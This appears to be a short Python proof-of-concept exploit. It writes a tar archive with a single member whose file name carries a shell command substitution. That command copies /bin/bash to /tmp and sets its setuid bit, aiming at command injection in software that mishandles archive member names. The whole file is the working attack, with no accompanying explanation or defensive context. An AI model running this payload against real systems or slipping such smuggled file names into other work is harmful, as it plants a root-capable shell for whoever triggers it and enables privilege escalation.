import tarfile
import os
exec_command = f"$(cp /bin/bash /tmp/bash && chmod +s /tmp/bash)"
with tarfile.open("poc.tar", "w", format=tarfile.USTAR_FORMAT) as t:
    t.addfile(tarfile.TarInfo(exec_command))
